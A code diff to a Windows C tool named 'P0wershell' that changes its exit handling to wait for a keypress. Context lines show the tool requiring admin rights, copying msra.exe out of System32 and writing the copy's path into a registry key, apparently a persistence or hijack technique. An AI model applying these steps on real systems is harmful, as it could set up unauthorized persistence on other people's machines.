@@ -9,10 +9,17 @@
 
 BOOL WINAPI IsUserAnAdmin(void);
 
+static void press_exit(int code) {
+    printf("\n[=] P0wershell exiting (%d). Press any key to close...\n", code);
+    Sleep(200);
+    _getch();
+    exit(code);
+}
+
 int main(void) {
     if (!IsUserAnAdmin()) {
         printf("[-] Not running as admin.\n");
-        return 1;
+        press_exit(1);
     }
 
     char path[MAX_PATH];
@@ -68,14 +75,14 @@ int main(void) {
         int hr = SHCreateDirectoryExA(NULL, targetDir, NULL);
         if (hr != ERROR_SUCCESS && hr != ERROR_ALREADY_EXISTS) {
             printf("[-] Failed to create directory (0x%lx)\n", hr);
-            return 1;
+            press_exit(1);
         }
     }
     printf("[+] Directory created: %s\n", targetDir);
 
     if (!CopyFileA("C:\\Windows\\System32\\msra.exe", targetMsra, FALSE)) {
         printf("[-] Failed to copy msra.exe (%lu)\n", GetLastError());
-        return 1;
+        press_exit(1);
     }
     printf("[+] msra.exe copied\n");
 
@@ -85,7 +92,7 @@ int main(void) {
         0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
     if (regRet != ERROR_SUCCESS) {
         printf("[-] Failed to open registry key (%ld)\n", regRet);
-        return 1;
+        press_exit(1);
     }
     RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)targetMsra, lstrlenA(targetMsra) + 1);
     RegCloseKey(hKey);
@@ -123,5 +130,5 @@ int main(void) {
     printf("Press 'q' to exit\n");
     Sleep(200);
     while (_getch() != 'q') {}
-    return 0;
+    press_exit(0);
 }
